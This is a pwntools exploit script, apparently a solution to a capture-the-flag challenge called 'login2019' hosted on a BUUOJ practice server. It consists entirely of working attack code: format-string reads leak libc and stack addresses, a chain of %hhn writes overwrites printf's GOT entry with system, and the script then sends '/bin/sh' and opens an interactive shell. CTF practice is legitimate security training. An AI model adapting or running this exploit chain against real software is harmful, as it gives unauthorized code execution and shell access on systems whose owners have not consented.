from pwn import *
from time import sleep

context(arch='i386', os='linux')

file_name = './login2019'

debug = 1
if debug:
    r = remote('node4.buuoj.cn', 29991)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

r.sendlineafter('Please input your name: ', 'aaaa')

p1 = b'%15$p'
r.sendline(p1)

r.recvuntil('This is the wrong password: 0x')
libc_start_main = int(r.recv(8), 16) - 0xf1
success('libc_start_main = ' + hex(libc_start_main))

libc = ELF('../../pwn/libc/u18/libc-2.27-32.so')
libc_base = libc_start_main - libc.sym['__libc_start_main']
system_addr = libc_base + libc.sym['system']

p2 = b'%6$p'
r.sendline(p2)
r.recvuntil('This is the wrong password: 0x')
stack1 = int(r.recv(8), 16)
success('stack1 = ' + hex(stack1))

p3 = b'%10$p'
r.sendline(p3)
r.recvuntil('This is the wrong password: 0x')
stack2 = int(r.recv(8), 16)
success('stack2 = ' + hex(stack2))

printf_got = elf.got['printf']
#0x804b014

p1 = '%20c%10$hhn'
r.sendlineafter('Try again!\n', p1)

p2 = '%' + str((stack2 & 0xFF) + 1) + 'c%6$hhn'
r.sendlineafter('Try again!\n', p2)

p3 = '%176c%10$hhn'
r.sendlineafter('Try again!\n', p3)

p4 = '%' + str((stack2 & 0xFF) + 2) + 'c%6$hhn'
r.sendlineafter('Try again!\n', p4)

p5 = '%4c%10$hhn'
r.sendlineafter('Try again!\n', p5)

p6 = '%' + str((stack2 & 0xFF) + 3) + 'c%6$hhn'
r.sendlineafter('Try again!\n', p6)

p7 = '%8c%10$hhn'
r.sendlineafter('Try again!\n', p7)

# printf_got + 1
stack2 += 4

p1 = '%' + str(stack2 & 0xFF) + 'c%6$hhn'
r.sendlineafter('Try again!\n', p1)

p2 = '%21c%10$hhn'
r.sendlineafter('Try again!\n', p2)

p3 = '%' + str((stack2 & 0xFF) + 1) + 'c%6$hhn'
r.sendlineafter('Try again!\n', p3)

p4 = '%176c%10$hhn'
r.sendlineafter('Try again!\n', p4)

p5 = '%' + str((stack2 & 0xFF) + 2) + 'c%6$hhn'
r.sendlineafter('Try again!\n', p5)

p6 = '%4c%10$hhn'
r.sendlineafter('Try again!\n', p6)

p7 = '%' + str((stack2 & 0xFF) + 3) + 'c%6$hhn'
r.sendlineafter('Try again!\n', p7)

p8 = '%8c%10$hhn'
r.sendlineafter('Try again!\n', p8)

# printf_got ------> system_addr

p1 = '%' + str(system_addr & 0xFF) + 'c%14$hhn'

p1 += '%' + str(((system_addr & 0xffff00) >> 8) - 0x10) + 'c%15$hn'
r.sendlineafter('Try again!\n', p1)

sleep(0.5)

r.sendline('/bin/sh')

r.interactive()
